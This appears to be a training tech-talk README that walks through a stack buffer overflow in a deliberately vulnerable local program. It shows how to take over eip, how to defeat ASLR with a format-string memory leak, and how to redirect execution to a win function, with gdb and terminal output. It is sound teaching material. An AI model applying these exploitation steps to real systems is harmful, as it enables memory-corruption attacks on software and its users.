# Defeating ASLR

## What is ASLR?

ASLR comes standard nowadays, so let's flip it off
```
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Now consider the memory map of our vulnerable program run twice.

```
[10:28:03] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr# ps -aux | grep vuln
root     16638  0.0  0.0   2056   552 pts/10   S+   10:27   0:00 ./vuln
root     16666  0.0  0.0  14220   932 pts/11   S+   10:28   0:00 grep --color=auto vuln
[10:28:18] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr# cat /proc/12687/maps
cat: /proc/12687/maps: No such file or directory
[10:29:18] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr# cat /proc/16638/maps
08048000-08049000 r-xp 00000000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
08049000-0804a000 r-xp 00000000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
0804a000-0804b000 rwxp 00001000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
f7e05000-f7e06000 rwxp 00000000 00:00 0
f7e06000-f7fb3000 r-xp 00000000 fc:00 3565722                            /lib32/libc-2.23.so
f7fb3000-f7fb4000 ---p 001ad000 fc:00 3565722                            /lib32/libc-2.23.so
f7fb4000-f7fb6000 r-xp 001ad000 fc:00 3565722                            /lib32/libc-2.23.so
f7fb6000-f7fb7000 rwxp 001af000 fc:00 3565722                            /lib32/libc-2.23.so
f7fb7000-f7fba000 rwxp 00000000 00:00 0
f7fd5000-f7fd6000 rwxp 00000000 00:00 0
f7fd6000-f7fd8000 r--p 00000000 00:00 0                                  [vvar]
f7fd8000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
f7fd9000-f7ffc000 r-xp 00000000 fc:00 3565733                            /lib32/ld-2.23.so
f7ffc000-f7ffd000 r-xp 00022000 fc:00 3565733                            /lib32/ld-2.23.so
f7ffd000-f7ffe000 rwxp 00023000 fc:00 3565733                            /lib32/ld-2.23.so
fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
[10:29:25] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr# ps -aux | grep vuln
root     16677  0.0  0.0   2056   552 pts/10   S+   10:29   0:00 ./vuln
root     16679  0.0  0.0  14220   932 pts/11   S+   10:29   0:00 grep --color=auto vuln
[10:29:40] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr# cat /proc/16677/maps
08048000-08049000 r-xp 00000000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
08049000-0804a000 r-xp 00000000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
0804a000-0804b000 rwxp 00001000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
f7e05000-f7e06000 rwxp 00000000 00:00 0
f7e06000-f7fb3000 r-xp 00000000 fc:00 3565722                            /lib32/libc-2.23.so
f7fb3000-f7fb4000 ---p 001ad000 fc:00 3565722                            /lib32/libc-2.23.so
f7fb4000-f7fb6000 r-xp 001ad000 fc:00 3565722                            /lib32/libc-2.23.so
f7fb6000-f7fb7000 rwxp 001af000 fc:00 3565722                            /lib32/libc-2.23.so
f7fb7000-f7fba000 rwxp 00000000 00:00 0
f7fd5000-f7fd6000 rwxp 00000000 00:00 0
f7fd6000-f7fd8000 r--p 00000000 00:00 0                                  [vvar]
f7fd8000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
f7fd9000-f7ffc000 r-xp 00000000 fc:00 3565733                            /lib32/ld-2.23.so
f7ffc000-f7ffd000 r-xp 00022000 fc:00 3565733                            /lib32/ld-2.23.so
f7ffd000-f7ffe000 rwxp 00023000 fc:00 3565733                            /lib32/ld-2.23.so
fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
```

If you re-enable ASLR run it two different times, you will see that the stack is in two different placess
```
[10:31:34] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr# ps -aux | grep vuln
root     16717  0.0  0.0   2056   488 pts/10   S+   10:31   0:00 ./vuln
root     16725  0.0  0.0  14220   924 pts/11   S+   10:31   0:00 grep --color=auto vuln
[10:31:38] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr# cat /proc/16717/maps
08048000-08049000 r-xp 00000000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
08049000-0804a000 r-xp 00000000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
0804a000-0804b000 rwxp 00001000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
f750f000-f7510000 rwxp 00000000 00:00 0
f7510000-f76bd000 r-xp 00000000 fc:00 3565722                            /lib32/libc-2.23.so
f76bd000-f76be000 ---p 001ad000 fc:00 3565722                            /lib32/libc-2.23.so
f76be000-f76c0000 r-xp 001ad000 fc:00 3565722                            /lib32/libc-2.23.so
f76c0000-f76c1000 rwxp 001af000 fc:00 3565722                            /lib32/libc-2.23.so
f76c1000-f76c4000 rwxp 00000000 00:00 0
f76df000-f76e0000 rwxp 00000000 00:00 0
f76e0000-f76e2000 r--p 00000000 00:00 0                                  [vvar]
f76e2000-f76e3000 r-xp 00000000 00:00 0                                  [vdso]
f76e3000-f7706000 r-xp 00000000 fc:00 3565733                            /lib32/ld-2.23.so
f7706000-f7707000 r-xp 00022000 fc:00 3565733                            /lib32/ld-2.23.so
f7707000-f7708000 rwxp 00023000 fc:00 3565733                            /lib32/ld-2.23.so
ffec9000-ffeea000 rwxp 00000000 00:00 0                                  [stack]
[10:31:47] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr#
[10:31:52] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr#
[10:31:53] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr# ps -aux | grep vuln
root     16733  0.0  0.0   2056   556 pts/10   S+   10:31   0:00 ./vuln
root     16739  0.0  0.0  14220  1084 pts/11   S+   10:31   0:00 grep --color=auto vuln
[10:31:54] root@wk-ishaw-04:~/Training/techtalk/defeat_aslr# cat /proc/16733/maps
08048000-08049000 r-xp 00000000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
08049000-0804a000 r-xp 00000000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
0804a000-0804b000 rwxp 00001000 fc:00 6543                               /home/ishaw/Training/techtalk/defeat_aslr/vuln
f7555000-f7556000 rwxp 00000000 00:00 0
f7556000-f7703000 r-xp 00000000 fc:00 3565722                            /lib32/libc-2.23.so
f7703000-f7704000 ---p 001ad000 fc:00 3565722                            /lib32/libc-2.23.so
f7704000-f7706000 r-xp 001ad000 fc:00 3565722                            /lib32/libc-2.23.so
f7706000-f7707000 rwxp 001af000 fc:00 3565722                            /lib32/libc-2.23.so
f7707000-f770a000 rwxp 00000000 00:00 0
f7725000-f7726000 rwxp 00000000 00:00 0
f7726000-f7728000 r--p 00000000 00:00 0                                  [vvar]
f7728000-f7729000 r-xp 00000000 00:00 0                                  [vdso]
f7729000-f774c000 r-xp 00000000 fc:00 3565733                            /lib32/ld-2.23.so
f774c000-f774d000 r-xp 00022000 fc:00 3565733                            /lib32/ld-2.23.so
f774d000-f774e000 rwxp 00023000 fc:00 3565733                            /lib32/ld-2.23.so
ffa2a000-ffa4b000 rwxp 00000000 00:00 0                                  [stack]
```

Where you can see all the addresses are randomized.

## Why ASLR

ASLR stands for Address Space Layout Randomization. Back in 80's and 90's era hacking, you could smash the stack, replace the saved `eip` with an address in your overflowed buffer, then point back at your shellcode.

Example:
```
stack
stack
stack
buffer oveflow: --
                | shellcode     <-
                | fluff           |
                | fluff           |   
(saved ebp)     | fluff           |
(saved eip)     | shellcode addr /
```

So then some clever person came up with ASLR (first implemented in the Linux Kernel in 2001), where after each reboot of the machine, the sections of memory would be loaded at different address. This meant that you could no longer throw an address on the stack right away in an exploit, instead, you now needed some sort of memory leak to his your sehllcode. Since non-executable stack was rolled out in the same period (2004 in the linux kernel) this meant that you were probably using offsets to find rop gadgets (but we can leave that to another talk).

## How do you get around ASLR?

Essentially, you need a memory leak of some kind so you know the current layout of the stack, to which  you will apply your offset.

## WalkThrough

### Vulnerable Program

Our vulnerable program has an unprotected `gets` call which allows for a buffer overflow. To compile our vulnerable program with `make`. In the makefile, there are a few flags:
```
-m32 :: make this a 32bit progam
-fno-pie :: disable position independent executable protections
-fno-stack-protector :: do not put in stack canaries
-z execstack :: turn off stack protrections (NX)
-o vuln ::
```

Now let's check the binary to make sure the protections are in the place we want:

```
# checksec vuln
[*] '/home/ishaw/Work/techtalks/defeat_aslr/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
``` 

### No ASLR

Since ASLR is standard now, we are actually going to have to turn it off in the kernel
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Alright, should be good to go. now if we enter the debugger on the program, we should be able to find the address of the function we want to trigger (`gen_file`).

```
# gdb vuln
pwndbg> b *main
pwndbg> r
pwndbg> disass gen_file
Dump of assembler code for function gen_file:
   0x0804851b <+0>:     push   ebp
...
``` 

This should be in the same place every time now. 

So let's start building our exploit, with the intent to put `0x0804851b` into eip. Running `find_eip` in `pwn_noASLR.py` we can make sure wer get the offsets correct.

```
# python3.8 pwn_noASLR.py
[+] Starting local process './vuln': pid 1453
Attach to the process with the debugger
...
```

Now open up another window
```
# gdb -p=1453
pwndbg> disass vuln_func
Dump of assembler code for function vuln_func:
   0x08048534 <+0>:     push   ebp
   0x08048535 <+1>:     mov    ebp,esp
   0x08048537 <+3>:     sub    esp,0x68
   0x0804853a <+6>:     sub    esp,0xc
   0x0804853d <+9>:     lea    eax,[ebp-0x68]
   0x08048540 <+12>:    push   eax
   0x08048541 <+13>:    call   0x80483d0 <gets@plt>
   0x08048546 <+18>:    add    esp,0x10
   0x08048549 <+21>:    sub    esp,0xc
   0x0804854c <+24>:    lea    eax,[ebp-0x68]
   0x0804854f <+27>:    push   eax
   0x08048550 <+28>:    call   0x80483c0 <printf@plt>
   0x08048555 <+33>:    add    esp,0x10
   0x08048558 <+36>:    sub    esp,0x8
   0x0804855b <+39>:    push   0x804865f
   0x08048560 <+44>:    lea    eax,[ebp-0x68]
   0x08048563 <+47>:    push   eax
   0x08048564 <+48>:    call   0x80483b0 <strcmp@plt>
   0x08048569 <+53>:    add    esp,0x10
   0x0804856c <+56>:    test   eax,eax
   0x0804856e <+58>:    je     0x8048572 <vuln_func+62>
   0x08048570 <+60>:    jmp    0x804853a <vuln_func+6>
   0x08048572 <+62>:    nop
   0x08048573 <+63>:    nop
   0x08048574 <+64>:    leave
   0x08048575 <+65>:    ret
End of assembler dump.
```

Let's break right before the `ret` so we can see if we control the stack properly.

```
pwndbg> b *vuln_func+65
pwndbg> c 
```

Heading back over to the exploit, send it over by just hitting enter. Now you should see that the next address the program will go to is the 4 B's we overwrote the old eip with.

```
pwndbg> x/dx $esp
0xffffd5ac:     0x42424242
```

So now we can control `eip`, let's pivot to the win function (we could to shellcode here, but we will leave that to another talk as well). All we need to do is put the address of the win function (`0x0804851b`).
Go into our `pwn_noASLR.py` and run the `hack_it()` function.

```
[12:43:39] root@wk-ishaw-04:~/Work/techtalks/defeat_aslr# ls
core  makefile  pwn_noASLR.py  README.md  vuln  vuln.c
[12:43:40] root@wk-ishaw-04:~/Work/techtalks/defeat_aslr# python3.8 pwn_noASLR.py
[+] Starting local process './vuln': pid 2388
[12:43:45] root@wk-ishaw-04:~/Work/techtalks/defeat_aslr# ls
core  makefile  pwn_noASLR.py  README.md  test.txt  vuln  vuln.c
```

As you can see, we triggered the win function, as the `test.txt` file has been created.

## With ASLR

Now if we recompile with ASLR activted:
```
# make clean
# echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
# make
```

We see that the exploit no longer works.
```
ubuntu@ip-172-31-83-147:~/techtalk/defeat_aslr$ ls
README.md  core  makefile  pwn_noASLR.py  vuln  vuln.c
ubuntu@ip-172-31-83-147:~/techtalk/defeat_aslr$ python3 pwn_noASLR.py
[+] Starting local process './vuln': pid 12991

ubuntu@ip-172-31-83-147:~/techtalk/defeat_aslr$ ls
README.md  core  makefile  pwn_noASLR.py  vuln  vuln.c
```

So what we need is a memory leak to determine the new address of the target function at each running.

### Memory Leak

One clever way of leaking memory if there is a `printf` statement available (such as in our `vuln_func`) is a format string vulnerability. Here is a great [paper](https://cs155.stanford.edu/papers/formatstring-1.2.pdf) on the subject of format string vulnerabilities.

```
$ ./vuln
%x
f7fa6000
```

So let's see if we can leak some valuable information.
In our new `pwn_ASLR.py` script, let's use the `find_eip` function to start messing around with the format strings. 
Something we would want to leak is a pointer on the stack, `%x %x` (going two pointers up so we go from `str_addr`,  and observing the leaks we see

```
$ python3 pwn_ASLR.py
...
b'0xf7fbd000 0xffc6b7d8'
```

Paired with the debugger infor
```
$ gdb -p<pid>
pwndbg> b *vuln_func+28
pwndbg> c
pwndbg> info reg
eax            0xffc6b780
```

Running it one more time

```
$ python3 pwn_ASLR.py
...
b'0xf7fa3000 0xffa1f078'
```

Paired with the debugger infor
```
$ gdb -p<pid>
pwndbg> b *vuln_func+28
pwndbg> c
pwndbg> info reg
eax            0xffa1f020
```

Now using python to check the offset math:
```
$ python3
Python 3.6.9 (default, Oct  8 2020, 12:12:24)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xffc6b7d8 - 0xffc6b780
88
>>> 0xffa1f078 - 0xffa1f020
88
```

We have consistent offsets! This is huge, and exactly what we were looking for.

## Redirect Control Flow

Now, we want to redirect control flow, since we have a consistent address, we should be able to redirect control flow to where we want it. Other options include using this info in another round of format string vulnerability to either to a write-what-where or more precisely leak info that is on the stack (maybe a .text segment address).

We have a few options here, can throw shellcode on the stack, redirect to that, we could also try and return to the leaking process, leak a stack address, and then ROP. 

Since we are avoiding the concepts of shellcode in this talk, we can just use the format string vulnerability to leak a .text segment address, turns out there is one 27 dwords up the stack.

```
pwndbg> disass gen_file
Dump of assembler code for function gen_file:
   0x565ac67d <+0>:     push   ebp
```

Running the leaking code

```
[+] Starting local process './vuln': pid 3606
Attach to the process with the debugger

b'0xf7efb000 0xffb81ca8 0xf7d93f02 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0xf7ef0020 (nil) 0xffb81cc8 0x565ac70e '
```

So we just go back into our take over EIP code and reput in the calculated offset:

```
ubuntu@ip-172-31-83-147:~/techtalk/defeat_aslr$ ls
README.md  core  makefile  pwn_ASLR.py  pwn_noASLR.py  vuln  vuln.c
ubuntu@ip-172-31-83-147:~/techtalk/defeat_aslr$ python3 pwn_ASLR.py 
[+] Starting local process './vuln': pid 3692
ubuntu@ip-172-31-83-147:~/techtalk/defeat_aslr$ ls
README.md  core  makefile  pwn_ASLR.py  pwn_noASLR.py  test.txt  vuln  vuln.c
```

